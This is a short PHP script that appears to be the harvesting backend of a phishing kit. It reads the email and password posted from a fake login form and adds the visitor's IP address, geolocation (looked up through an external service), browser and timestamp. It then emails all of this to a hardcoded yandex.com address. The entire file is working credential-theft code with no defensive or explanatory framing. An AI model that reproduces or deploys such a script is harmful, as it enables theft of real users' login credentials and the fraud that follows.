<?php



$ips = getenv("REMOTE_ADDR");
$data = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ips));
$country = $data['geoplugin_countryName'];
$city = $data['geoplugin_city'];
$continent = $data['geoplugin_continentName'];
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ips);
if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];
 
$resultbox = "greywoods2522@yandex.com";


         $subject = "New Login from justin well office";
		 
		 $message =  "Online ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
		 $message .= "IP           : ".$ips."\r\n";
         $message .= "Country           : ".$country."\r\n";
         $message .= "City           : ".$city."\r\n";
         $message .= "Continent           : ".$continent."\r\n";
		 $message .= "Browser           : ".$browserAgent."\r\n";
		 $message .= "Date And Time          : ".$timedate."\r\n";			 
		 $message .= "Login Successful       : No\r\n";
		$header = "Content type:justin well 09030812441\r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 mail ($resultbox,$subject,$message,$header);
		
}




?> 